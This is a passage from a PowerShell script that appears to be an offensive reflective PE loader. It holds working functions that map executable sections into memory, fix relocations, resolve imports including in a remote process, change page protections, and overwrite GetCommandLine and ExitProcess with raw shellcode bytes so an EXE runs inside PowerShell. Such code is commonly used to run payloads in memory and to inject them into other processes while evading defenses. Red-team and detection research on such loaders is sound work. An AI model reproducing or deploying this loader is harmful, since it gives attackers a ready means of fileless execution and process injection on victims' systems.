                        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
                    }
    
                    #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
                    if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize) {
                        $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                        [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                        Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                        $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
                    }
                }
            }
    
    
            Function Update-MemoryAddresses {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [System.Object]
                    $PEInfo,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [Int64]
                    $OriginalImageBase,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Constants,
    
                    [Parameter(Position = 3, Mandatory = $true)]
                    [System.Object]
                    $Win32Types
                )
    
                [Int64]$BaseDifference = 0
                $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
                [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
    
                #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
                if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                        -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0)) {
                    return
                }
    
    
                elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true) {
                    $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
                    $AddDifference = $false
                }
                elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true) {
                    $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
                }
    
                #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
                [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
                while ($true) {
                    #If SizeOfBlock == 0, we are done
                    $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
    
                    if ($BaseRelocationTable.SizeOfBlock -eq 0) {
                        break
                    }
    
                    [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
                    $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2
    
                    #Loop through each relocation
                    for ($i = 0; $i -lt $NumRelocations; $i++) {
                        #Get info for this relocation
                        $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                        [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])
    
                        #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                        [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                        [UInt16]$RelocType = $RelocationInfo -band 0xF000
                        for ($j = 0; $j -lt 12; $j++) {
                            $RelocType = [Math]::Floor($RelocType / 2)
                        }
    
                        #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                        #This appears to be true for EXE's as well.
                        #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                        if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                                -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64)) {
                            #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                            [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                            [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
    
                            if ($AddDifference -eq $true) {
                                [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                            }
                            else {
                                [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                            }
    
                            [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                        }
                        elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE) {
                            #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                            Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                        }
                    }
    
                    $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
                }
            }
    
    
            Function Import-DllImports {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [System.Object]
                    $PEInfo,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Functions,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Types,
    
                    [Parameter(Position = 3, Mandatory = $true)]
                    [System.Object]
                    $Win32Constants,
    
                    [Parameter(Position = 4, Mandatory = $false)]
                    [IntPtr]
                    $RemoteProcHandle
                )
    
                $RemoteLoading = $false
                if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle) {
                    $RemoteLoading = $true
                }
    
                if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0) {
                    [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
    
                    while ($true) {
                        $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
    
                        #If the structure is null, it signals that this is the end of the array
                        if ($ImportDescriptor.Characteristics -eq 0 `
                                -and $ImportDescriptor.FirstThunk -eq 0 `
                                -and $ImportDescriptor.ForwarderChain -eq 0 `
                                -and $ImportDescriptor.Name -eq 0 `
                                -and $ImportDescriptor.TimeDateStamp -eq 0) {
                            Write-Verbose "Done importing DLL imports"
                            break
                        }
    
                        $ImportDllHandle = [IntPtr]::Zero
                        $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
    
                        if ($RemoteLoading -eq $true) {
                            $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                        }
                        else {
                            $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                        }
    
                        if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero)) {
                            throw "Error importing DLL, DLLName: $ImportDllPath"
                        }
    
                        #Get the first thunk, then loop through all of them
                        [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                        [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                        [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
    
                        while ($OriginalThunkRefVal -ne [IntPtr]::Zero) {
                            $LoadByOrdinal = $false
                            [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                            #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                            #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                            #   and doing the comparison, just see if it is less than 0
                            [IntPtr]$NewThunkRef = [IntPtr]::Zero
                            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0) {
                                [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                                $LoadByOrdinal = $true
                            }
                            elseif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0) {
                                [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                                $LoadByOrdinal = $true
                            }
                            else {
                                [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                                $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                                $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                                $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                            }
    
                            if ($RemoteLoading -eq $true) {
                                [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                            }
                            else {
                                [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                            }
    
                            if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero) {
                                if ($LoadByOrdinal) {
                                    Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                                }
                                else {
                                    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                                }
                            }
    
                            [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
    
                            $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                            [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                            [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
    
                            #Cleanup
                            #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                            if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero)) {
                                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                                $ProcedureNamePtr = [IntPtr]::Zero
                            }
                        }
    
                        $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
                    }
                }
            }
    
            Function Get-VirtualProtectValue {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [UInt32]
                    $SectionCharacteristics
                )
    
                $ProtectionFlag = 0x0
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0) {
                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0) {
                        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                            $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                        }
                        else {
                            $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                        }
                    }
                    else {
                        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                            $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                        }
                        else {
                            $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                        }
                    }
                }
                else {
                    if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0) {
                        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                            $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                        }
                        else {
                            $ProtectionFlag = $Win32Constants.PAGE_READONLY
                        }
                    }
                    else {
                        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0) {
                            $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                        }
                        else {
                            $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                        }
                    }
                }
    
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0) {
                    $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
                }
    
                return $ProtectionFlag
            }
    
            Function Update-MemoryProtectionFlags {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [System.Object]
                    $PEInfo,
            
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Functions,
            
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Constants,
            
                    [Parameter(Position = 3, Mandatory = $true)]
                    [System.Object]
                    $Win32Types
                )
            
                for ( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++) {
                    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
                    $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
                    [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
                
                    [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
                    [UInt32]$SectionSize = $SectionHeader.VirtualSize
                
                    [UInt32]$OldProtectFlag = 0
                    Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
                    $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
                    if ($Success -eq $false) {
                        Throw "Unable to change memory protection"
                    }
                }
            }
    
            #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
            #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
            Function Update-ExeFunctions {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [System.Object]
                    $PEInfo,
        
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Functions,
        
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Constants,
        
                    [Parameter(Position = 3, Mandatory = $true)]
                    [String]
                    $ExeArguments,
        
                    [Parameter(Position = 4, Mandatory = $true)]
                    [IntPtr]
                    $ExeDoneBytePtr
                )
            
                #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
                $ReturnArray = @()
        
                $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
                [UInt32]$OldProtectFlag = 0
        
                [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
                if ($Kernel32Handle -eq [IntPtr]::Zero) {
                    throw "Kernel32 handle null"
                }
        
                [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
                if ($KernelBaseHandle -eq [IntPtr]::Zero) {
                    throw "KernelBase handle null"
                }
        
                #################################################
                #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
                #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
                $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
        
                [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
                [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")
        
                if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero) {
                    throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
                }
        
                #Prepare the shellcode
                [Byte[]]$Shellcode1 = @()
                if ($PtrSize -eq 8) {
                    $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
                }
                $Shellcode1 += 0xb8
        
                [Byte[]]$Shellcode2 = @(0xc3)
                $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
                #Make copy of GetCommandLineA and GetCommandLineW
                $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
                $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
                $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
                $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
                $ReturnArray += , ($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
                $ReturnArray += , ($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
        
                #Overwrite GetCommandLineA
                [UInt32]$OldProtectFlag = 0
                $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false) {
                    throw "Call to VirtualProtect failed"
                }
        
                $GetCommandLineAAddrTemp = $GetCommandLineAAddr
                Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
                $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
                $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
                Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
                $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
                #Overwrite GetCommandLineW
                [UInt32]$OldProtectFlag = 0
                $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false) {
                    throw "Call to VirtualProtect failed"
                }
        
                $GetCommandLineWAddrTemp = $GetCommandLineWAddr
                Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
                $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
                $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
                Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
                $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
                #################################################
        
                #################################################
                #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
                #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
                #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
                #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
                $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
                        , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll", "msvcr120.dll", "msvcrt.dll")
        
                foreach ($Dll in $DllList) {
                    [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
                    if ($DllHandle -ne [IntPtr]::Zero) {
                        [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                        [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                        if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero) {
                            "Error, couldn't find _wcmdln or _acmdln"
                        }
        
                        $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                        $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        
                        #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                        $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                        $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                        $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                        $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                        $ReturnArray += , ($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                        $ReturnArray += , ($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
        
                        $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                        if ($Success = $false) {
                            throw "Call to VirtualProtect failed"
                        }
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                        $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
        
                        $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                        if ($Success = $false) {
                            throw "Call to VirtualProtect failed"
                        }
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                        $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                    }
                }
                #################################################
        
                #################################################
                #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.
        
                $ReturnArray = @()
                $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
                #CorExitProcess (compiled in to visual studio c++)
                [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
                if ($MscoreeHandle -eq [IntPtr]::Zero) {
                    throw "mscoree handle null"
                }
                [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
                if ($CorExitProcessAddr -eq [IntPtr]::Zero) {
                    Throw "CorExitProcess address not found"
                }
                $ExitFunctions += $CorExitProcessAddr
        
                #ExitProcess (what non-managed programs use)
                [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
                if ($ExitProcessAddr -eq [IntPtr]::Zero) {
                    Throw "ExitProcess address not found"
                }
                $ExitFunctions += $ExitProcessAddr
        
                [UInt32]$OldProtectFlag = 0
                foreach ($ProcExitFunctionAddr in $ExitFunctions) {
                    $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
                    #The following is the shellcode (Shellcode: ExitThread.asm):
                    #32bit shellcode
                    [Byte[]]$Shellcode1 = @(0xbb)
                    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
                    #64bit shellcode (Shellcode: ExitThread.asm)
                    if ($PtrSize -eq 8) {
                        [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                        [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
                    }
                    [Byte[]]$Shellcode3 = @(0xff, 0xd3)
                    $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
        
                    [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
                    if ($ExitThreadAddr -eq [IntPtr]::Zero) {
                        Throw "ExitThread address not found"
                    }
        
                    $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
                    if ($Success -eq $false) {
                        Throw "Call to VirtualProtect failed"
                    }
        
                    #Make copy of original ExitProcess bytes
                    $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
                    $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
                    $ReturnArray += , ($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
        
                    #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
                    #   call ExitThread
                    Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
                    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
                    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
                    Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
                    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
                    $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
                    Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp
        
                    $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
                }
                #################################################
        
                Write-Output $ReturnArray
            }
    
            #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
            #   It copies Count bytes from Source to Destination.
            Function Copy-ArrayOfMemAddresses {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [Array[]]
                    $CopyInfo,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $Win32Functions,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [System.Object]
                    $Win32Constants
                )
    
                [UInt32]$OldProtectFlag = 0
                foreach ($Info in $CopyInfo) {
                    $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
                    if ($Success -eq $false) {
                        Throw "Call to VirtualProtect failed"
                    }
    
                    $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
    
                    $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
                }
            }
    
    
